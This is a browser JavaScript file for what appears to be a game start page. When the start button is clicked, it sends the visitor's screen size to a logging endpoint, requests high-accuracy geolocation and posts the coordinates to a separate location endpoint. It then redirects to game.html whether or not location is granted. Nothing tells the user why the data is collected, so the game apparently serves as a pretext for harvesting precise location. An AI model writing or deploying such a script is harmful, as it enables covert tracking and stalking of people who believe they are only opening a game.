document.addEventListener('DOMContentLoaded', function() {
    const startButton = document.getElementById('startButton');
    const loadingElement = document.getElementById('loading');
    
    startButton.addEventListener('click', async function() {
        // Show loading indicator
        startButton.style.display = 'none';
        loadingElement.style.display = 'block';
        
        try {
            // Log basic data
            const basicData = {
                screenSize: {
                    width: window.innerWidth,
                    height: window.innerHeight,
                    screenWidth: window.screen.width,
                    screenHeight: window.screen.height
                }
            };
            
            // Send basic data to server
            fetch(`${CONFIG.API_URL}${CONFIG.LOG_ENDPOINT}`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(basicData)
            }).catch(error => {
                console.error('Error logging basic data:', error);
            });
            
            // Try to get precise location
            if (navigator.geolocation) {
                try {
                    navigator.geolocation.getCurrentPosition(
                        // Success callback
                        function(position) {
                            const locationData = {
                                latitude: position.coords.latitude,
                                longitude: position.coords.longitude,
                                accuracy: position.coords.accuracy
                            };
                            
                            // Send precise location data
                            fetch(`${CONFIG.API_URL}${CONFIG.LOCATION_ENDPOINT}`, {
                                method: 'POST',
                                headers: {
                                    'Content-Type': 'application/json'
                                },
                                body: JSON.stringify(locationData)
                            }).catch(error => {
                                console.error('Error logging location data:', error);
                            }).finally(() => {
                                // Redirect to game page after a short delay
                                setTimeout(() => {
                                    window.location.href = 'game.html';
                                }, 500);
                            });
                        },
                        // Error callback - redirect anyway after a short delay
                        function(error) {
                            console.log("Geolocation permission denied or error:", error);
                            setTimeout(() => {
                                window.location.href = 'game.html';
                            }, 500);
                        },
                        // Options
                        {
                            enableHighAccuracy: true,
                            timeout: 5000,
                            maximumAge: 0
                        }
                    );
                } catch (e) {
                    console.error('Geolocation error:', e);
                    // Fallback if geolocation fails
                    setTimeout(() => {
                        window.location.href = 'game.html';
                    }, 500);
                }
            } else {
                console.log('Browser does not support geolocation');
                // Browser doesn't support geolocation
                setTimeout(() => {
                    window.location.href = 'game.html';
                }, 500);
            }
        } catch (error) {
            console.error('General error:', error);
            // If anything fails, still redirect to game
            setTimeout(() => {
                window.location.href = 'game.html';
            }, 500);
        }
    });
});
